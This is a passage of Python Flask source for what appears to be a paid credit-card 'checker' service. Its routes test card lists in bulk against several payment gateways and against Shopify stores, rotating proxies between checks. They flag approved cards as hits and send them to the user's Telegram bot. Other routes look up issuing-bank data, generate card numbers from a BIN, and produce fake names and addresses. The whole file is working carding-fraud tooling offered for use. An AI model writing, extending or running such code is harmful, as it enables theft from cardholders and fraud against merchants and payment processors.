    if 'telegram_id' not in session or 'access_key' not in session:
        return jsonify({'error': 'Authentication required'}), 401

    user = get_user_by_access_key(session['access_key'])
    if not user:
        session.clear()
        return jsonify({'error': 'Invalid session'}), 401
    if user['credits'] <= 0:
        return jsonify({'error': 'Insufficient credits!'}), 403

    session_id = get_session_id()
    card_data = request.form.get('card_data', '').strip()
    gateway = request.form.get('gateway', 'au')

    if not card_data:
        return jsonify({'error': 'No card data provided'}), 400

    # Process the card
    if gateway == 'au':
        result = process_card_au(card_data)
    elif gateway == 'chk':
        result = check_card(card_data)
    elif gateway == 'vbv':
        result = check_vbv_card(card_data)
    elif gateway == 'b3':
        result = process_card_b3(card_data)
    elif gateway == "svb":
        result = process_card_svb(card_data)
    elif gateway == "pp":
        result = process_card_pp(card_data)
    else:
        return jsonify({'error': 'Invalid gateway selected'}), 400

    # Deduct credits
    new_credits = update_user_credits(session['telegram_id'], -1)
    session['credits'] = new_credits
    
    # Update user stats
    update_user_stats(session['telegram_id'], result.get('status', 'Error'))
    
    # Log the card check
    log_card(session['telegram_id'], card_data, result.get('status', 'Error'), 
             result.get('gateway', gateway.upper()), result.get('response', 'Unknown error'))

    # BIN info lookup
    bin_number = card_data[:6]
    bin_info = {}
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
        if r.status_code == 200:
            bin_info = r.json()
    except Exception as e:
        bin_info = {"error": str(e)}

    # Store result
    result_id = str(uuid.uuid4())
    timestamp = datetime.now().strftime("%H:%M:%S")

    result_entry = {
        'id': result_id,
        'card': card_data,
        'status': result.get('status', 'Error'),
        'response': result.get('response', 'Unknown error'),
        'gateway': result.get('gateway', gateway.upper()),
        'timestamp': timestamp,
        'bin': bin_info
    }

    with result_lock:
        if session_id not in results:
            results[session_id] = []
        results[session_id].insert(0, result_entry)
        if len(results[session_id]) > 50:
            results[session_id] = results[session_id][:50]

    # Bot notification for approved cards
    if result_entry['status'].lower() == 'approved':
        send_card_to_user_bot(session['telegram_id'], result_entry)

    return jsonify({
        'success': True,
        **result_entry
    })

import concurrent.futures

def safe_process_card(gateway_func, card_data, timeout=12):
    """Run one card check safely in a thread with timeout and better error handling."""
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
            future = executor.submit(gateway_func, card_data)
            result = future.result(timeout=timeout)
            
            if not isinstance(result, dict):
                return {
                    "status": "Error",
                    "response": "Invalid response format from gateway",
                    "gateway": gateway_func.__name__,
                }
            
            response_text = str(result.get("response", "")).lower()
            if any(blocked_indicator in response_text for blocked_indicator in 
                  ["timeout", "block", "fail", "error", "invalid", "refused", "denied"]):
                return {
                    "status": "Error",
                    "response": f"Gateway issue: {result.get('response', 'Unknown error')}",
                    "gateway": gateway_func.__name__,
                }
            
            return result
            
    except concurrent.futures.TimeoutError:
        return {
            "status": "Error",
            "response": f"Gateway timeout after {timeout}s",
            "gateway": gateway_func.__name__,
        }
    except Exception as e:
        return {
            "status": "Error",
            "response": f"Gateway error: {str(e)}",
            "gateway": gateway_func.__name__,
        }

@app.route("/mass_check", methods=["GET"])
def mass_check():
    if "telegram_id" not in session or "access_key" not in session:
        def error_generate():
            yield f"data: {json.dumps({'error': 'Authentication required'})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    user = get_user_by_access_key(session["access_key"])
    if not user:
        session.clear()
        def error_generate():
            yield f"data: {json.dumps({'error': 'Invalid session'})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    # Prepare cards
    raw_card_list = request.args.get("card_list", "")
    card_list = [c.strip() for c in raw_card_list.split("\n") if c.strip()]
    card_count = len(card_list)
    gateway = request.args.get("gateway", "au")

    # Check credits upfront
    if user['credits'] < card_count:
        def error_generate():
            error_msg = f'Insufficient credits. You have {user["credits"]} but need {card_count}'
            yield f"data: {json.dumps({'error': error_msg})}\n\n"
        return Response(stream_with_context(error_generate()), mimetype="text/event-stream")

    # Deduct credits for all cards upfront
    new_credits = update_user_credits(session["telegram_id"], -card_count)
    session["credits"] = new_credits

    def generate():
        processed_count = 0
        successful_checks = 0
        
        for i, card_data in enumerate(card_list):
            try:
                result = None
                
                # Use ONLY the selected gateway - NO FALLBACK
                if gateway == "au":
                    result = safe_process_card(process_card_au, card_data, timeout=10)
                elif gateway == "chk":
                    result = safe_process_card(check_card, card_data, timeout=10)
                elif gateway == "vbv":
                    result = safe_process_card(check_vbv_card, card_data, timeout=15)
                elif gateway == "b3":
                    result = safe_process_card(process_card_b3, card_data, timeout=10)
                elif gateway == "svb":
                    result = safe_process_card(process_card_svb, card_data, timeout=10)
                elif gateway == "pp":
                    result = safe_process_card(process_card_pp, card_data, timeout=10)
                else:
                    result = {"status": "Error", "response": "Invalid gateway", "gateway": "N/A"}

                res_data = {
                    "card": card_data,
                    "status": result.get("status", "Error"),
                    "response": result.get("response", "Unknown error"),
                    "gateway": result.get("gateway", gateway.upper()),
                }

                # Update user stats and log the card
                update_user_stats(session["telegram_id"], res_data["status"])
                log_card(session["telegram_id"], card_data, res_data["status"], 
                         res_data["gateway"], res_data["response"])

                # Count successful checks (non-error responses)
                if result.get("status") != "Error":
                    successful_checks += 1

                # Send approved to user bot
                if res_data["status"].lower() == "approved":
                    try:
                        bin_number = card_data[:6]
                        bin_info = {}
                        try:
                            r = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=5)
                            if r.status_code == 200:
                                bin_info = r.json()
                        except:
                            pass
                            
                        send_card_to_user_bot(
                            session["telegram_id"],
                            {
                                "card": card_data,
                                "status": res_data["status"],
                                "response": res_data["response"],
                                "gateway": res_data["gateway"],
                                "bin": bin_info,
                                "timestamp": datetime.now().strftime("%H:%M:%S"),
                            },
                        )
                    except Exception as bot_error:
                        print(f"Bot notification failed: {bot_error}")

                processed_count += 1
                yield f"data: {json.dumps(res_data)}\n\n"

                # Dynamic delay based on success rate
                if successful_checks / max(1, processed_count) > 0.7:
                    time.sleep(0.3)
                else:
                    time.sleep(1.0)

            except Exception as e:
                # Log the error but continue with next card
                error_data = {
                    "card": card_data,
                    "status": "Error",
                    "response": f"Processing failed: {str(e)}",
                    "gateway": gateway.upper(),
                }
                yield f"data: {json.dumps(error_data)}\n\n"
                time.sleep(1.0)  # Longer delay after error
                continue

        # Send completion message
        yield f"data: {json.dumps({'complete': True, 'processed': processed_count, 'total': card_count, 'successful': successful_checks})}\n\n"

    return Response(stream_with_context(generate()), mimetype="text/event-stream")
    
@app.route('/save_bot', methods=['POST'])
def save_bot():
    if 'telegram_id' not in session:
        return redirect(url_for('login'))

    bot_token = request.form.get('bot_token', '').strip()
    chat_id = request.form.get('chat_id', '').strip()

    user = get_user_by_telegram_id(session['telegram_id'])
    if user:
        user['bot_token'] = bot_token
        user['chat_id'] = chat_id
        save_user(user)

    return redirect(url_for('profile'))

@app.route('/get_results')
def get_results():
    session_id = get_session_id()
    with result_lock:
        session_results = results.get(session_id, [])
    return jsonify({'results': session_results})

@app.route('/clear_results')
def clear_results():
    session_id = get_session_id()
    with result_lock:
        if session_id in results:
            results[session_id] = []
    return jsonify({'success': True})

@app.route('/shopify')
def shopify_check():
    if 'telegram_id' not in session or 'access_key' not in session:
        return redirect(url_for('login'))
    return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/shopify_check', methods=['GET', 'POST'])
def shopify_check_process():
    if 'telegram_id' not in session or 'access_key' not in session:
        return jsonify({'error': 'Authentication required'}), 401
    
    # Handle both GET (from EventSource) and POST (from form) requests
    if request.method == 'POST':
        # Check if files were uploaded
        sites_file = request.files.get('sites_file')
        proxies_file = request.files.get('proxies_file')
        cards_file = request.files.get('cards_file')
        
        # Process uploaded files or form data
        if sites_file and sites_file.filename:
            sites = sites_file.read().decode('utf-8').splitlines()
        else:
            sites = request.form.get('sites', '').strip().split('\n')
            
        if proxies_file and proxies_file.filename:
            proxies = proxies_file.read().decode('utf-8').splitlines()
        else:
            proxies = request.form.get('proxies', '').strip().split('\n')
            
        if cards_file and cards_file.filename:
            cards = cards_file.read().decode('utf-8').splitlines()
        else:
            cards = request.form.get('cards', '').strip().split('\n')
    else:  # GET request from EventSource
        sites = request.args.get('sites', '').strip().split('\n')
        proxies = request.args.get('proxies', '').strip().split('\n')
        cards = request.args.get('cards', '').strip().split('\n')
    
    # Clean up empty lines
    sites = [site.strip() for site in sites if site.strip()]
    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
    cards = [card.strip() for card in cards if card.strip()]
    
    if not sites or not cards:
        return jsonify({'error': 'Sites and cards are required'}), 400
    
    # Prepare for streaming response
    def generate():
        for i, card in enumerate(cards):
            # Select a random site
            site = random.choice(sites) if sites else ""
            
            # Select a random proxy if available
            proxy = random.choice(proxies) if proxies else None
            
            # Prepare proxy dict if available
            proxy_dict = None
            if proxy:
                proxy_parts = proxy.split(':')
                if len(proxy_parts) == 4:
                    ip, port, username, password = proxy_parts
                    proxy_dict = {
                        'http': f'http://{username}:{password}@{ip}:{port}',
                        'https': f'http://{username}:{password}@{ip}:{port}'
                    }
                elif len(proxy_parts) == 2:
                    ip, port = proxy_parts
                    proxy_dict = {
                        'http': f'http://{ip}:{port}',
                        'https': f'http://{ip}:{port}'
                    }
            
            # Prepare the API URL
            api_url = f"https://autoshopify.stormx.pw/index.php?site={site}&cc={card}"
            if proxy:
                api_url += f"&proxy={proxy}"
            
            try:
                # Make the request
                response = requests.get(api_url, proxies=proxy_dict, timeout=30)
                data = response.json()
                
                response_upper = data.get('Response', '').upper()
                price = data.get('Price', 'N/A')
                gateway = data.get('Gateway', 'N/A')
                
                if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
                    bot_response = data.get('Response', 'Unknown')
                    status = 'HIT'
                elif '3D' in response_upper or 'OTP' in response_upper:
                    bot_response = data.get('Response', 'Unknown')
                    status = 'APPROVED'
                elif any(x in response_upper for x in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP']):
                    bot_response = data.get('Response', 'Unknown')
                    status = 'APPROVED'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                else:
                    bot_response = data.get('Response', 'Unknown')
                    status = 'DECLINED'
                
                # Send approved cards to user's bot
                if status in ['APPROVED', 'APPROVED_OTP']:
                    try:
                        send_card_to_user_bot(
                            session['telegram_id'],
                            {
                                'card': card,
                                'status': status,
                                'response': bot_response,
                                'gateway': 'SHOPIFY',
                                'bin': {},
                                'timestamp': datetime.now().strftime("%H:%M:%S"),
                                'amount': price
                            }
                        )
                    except Exception as bot_error:
                        print(f"Bot notification failed: {bot_error}")
                
                # Send result via SSE
                result_data = {
                    'card': card,
                    'status': status,
                    'response': bot_response,
                    'gateway': gateway,
                    'amount': price,
                    'site': site,
                    'proxy': proxy or 'None'
                }
                
                yield f"data: {json.dumps(result_data)}\n\n"
                
            except Exception as e:
                error_data = {
                    'card': card,
                    'status': 'ERROR',
                    'response': f'Request failed: {str(e)}',
                    'gateway': 'SHOPIFY',
                    'amount': 'N/A',
                    'site': site,
                    'proxy': proxy or 'None'
                }
                yield f"data: {json.dumps(error_data)}\n\n"
            
            # Small delay between requests
            time.sleep(0.5)
        
        # Send completion message
        yield f"data: {json.dumps({'complete': True})}\n\n"
    
    return Response(stream_with_context(generate()), mimetype='text/event-stream')
    
@app.route('/gen', methods=['GET', 'POST'])
def gen_card():
    if request.method == 'GET':
        return render_template('gen.html', username=session.get('username'), credits=session.get('credits', 0))
    
    # Handle POST request
    bin_number = request.form.get('bin', '').strip()
    count = request.form.get('quantity', '10').strip()

    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://drlabapis.onrender.com/api/ccgenerator?bin={bin_number}&count={count}"
        res = requests.get(api_url)
        
        if 'text/html' in res.headers.get('Content-Type', ''):
            return jsonify({'success': False, 'error': 'Card generation service is temporarily unavailable'})
        
        try:
            data = res.json()
            cards = data.get("cards", [])
        except json.JSONDecodeError:
            content = res.text
            card_pattern = r'\b\d{16}\|\d{2}\|\d{2,4}\|\d{3,4}\b'
            cards = re.findall(card_pattern, content)
            
            if not cards:
                return jsonify({'success': False, 'error': 'Failed to generate cards. Invalid response from service.'})

        if int(count) > 10:
            content = "\n".join(cards)
            return send_file(
                io.BytesIO(content.encode("utf-8")),
                as_attachment=True,
                download_name=f"generated_cards_{bin_number}.txt",
                mimetype="text/plain"
            )

        return render_template('gen.html', 
                              username=session.get('username'), 
                              credits=session.get('credits', 0),
                              cards=cards,
                              bin=bin_number)

    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/fake_address')
def fake_address():
    if 'telegram_id' not in session or 'access_key' not in session:
        return redirect(url_for('login'))
    return render_template('fake_address.html', username=session.get('username'), credits=session.get('credits', 0))

@app.route('/generate_address', methods=['POST'])
def generate_address():
    try:
        country = request.form.get('country', 'us')
        count = int(request.form.get('count', 1))
        
        # List of available countries with Faker support
        available_countries = [
            'us', 'gb', 'ca', 'au', 'de', 'fr', 'es', 'it', 'nl', 'br', 
            'mx', 'in', 'jp', 'cn', 'ru', 'se', 'no', 'dk', 'fi', 'pl',
            'tr', 'za', 'eg', 'ng', 'ke', 'ar', 'cl', 'co', 'pe', 've',
            'ch', 'at', 'be', 'pt', 'gr', 'cz', 'hu', 'ro', 'il', 'sa',
            'ae', 'sg', 'my', 'th', 'id', 'ph', 'vn', 'kr', 'tw', 'hk'
        ]
        
        if country not in available_countries:
            return jsonify({'success': False, 'error': 'Country not supported'})
        
        addresses = []
        for _ in range(count):
            try:
                response = requests.get(f'https://randomuser.me/api/?nat={country}', timeout=10)
                if response.status_code == 200:
                    data = response.json()
                    user = data['results'][0]
                    
                    address = {
                        'name': f"{user['name']['first']} {user['name']['last']}",
                        'street': f"{user['location']['street']['number']} {user['location']['street']['name']}",
                        'city': user['location']['city'],
                        'state': user['location']['state'],
                        'zip': user['location']['postcode'],
                        'country': user['nat'].upper(),
                        'phone': user['phone'],
                        'email': user['email']
                    }
                    addresses.append(address)
            except Exception as e:
                print(f"Error generating address: {e}")
                continue
        
        if not addresses:
            return jsonify({'success': False, 'error': 'Failed to generate addresses'})
        
        if count > 1:
            # Format for download
            content = ""
            for i, addr in enumerate(addresses, 1):
                content += f"=== Address {i} ===\n"
                content += f"Name: {addr['name']}\n"
                content += f"Street: {addr['street']}\n"
                content += f"City: {addr['city']}\n"
                content += f"State: {addr['state']}\n"
                content += f"ZIP: {addr['zip']}\n"
                content += f"Country: {addr['country']}\n"
                content += f"Phone: {addr['phone']}\n"
                content += f"Email: {addr['email']}\n\n"
            
            return send_file(
                io.BytesIO(content.encode("utf-8")),
                as_attachment=True,
                download_name=f"fake_addresses_{country}.txt",
                mimetype="text/plain"
            )
            
        return jsonify({'success': True, 'addresses': addresses})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/bin_info', methods=['POST'])
def bin_info():
    bin_number = request.form.get('bin', '').strip()
    if not bin_number:
        return jsonify({'success': False, 'error': 'BIN is required'})

    try:
        api_url = f"https://bins.antipublic.cc/bins/{bin_number}"
        res = requests.get(api_url)
        if res.status_code != 200:
            return jsonify({'success': False, 'error': 'BIN not found'})
        return jsonify({'success': True, 'data': res.json()})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/get_live_stats')
def get_live_stats():
    """API endpoint to get live statistics"""
    stats = load_json(STATS_FILE, {
        'total_checks': 0,
        'total_approved': 0,
        'total_declined': 0,
        'live_users': 0,
        'peak_users': 0
    })
    
    return jsonify({
        'live_users': stats.get('live_users', 0),
        'total_checks': stats.get('total_checks', 0),
        'total_approved': stats.get('total_approved', 0),
        'total_declined': stats.get('total_declined', 0),
        'peak_users': stats.get('peak_users', 0)
    })

# -----------------------
# MAIN
# -----------------------
if __name__ == '__main__':
    init_cloud_storage()
    ensure_users_format()
    app.run(debug=True, host='0.0.0.0', port=5000)
